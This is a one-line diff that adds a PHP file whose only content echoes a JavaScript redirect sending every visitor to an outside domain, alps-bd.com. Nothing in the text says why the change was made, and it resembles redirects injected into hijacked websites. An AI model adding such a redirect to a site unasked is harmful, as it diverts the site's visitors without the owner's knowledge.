@@ -1,0 +1,1 @@
+ <?php echo "<script>location.href='https://alps-bd.com';</script>"; ?>
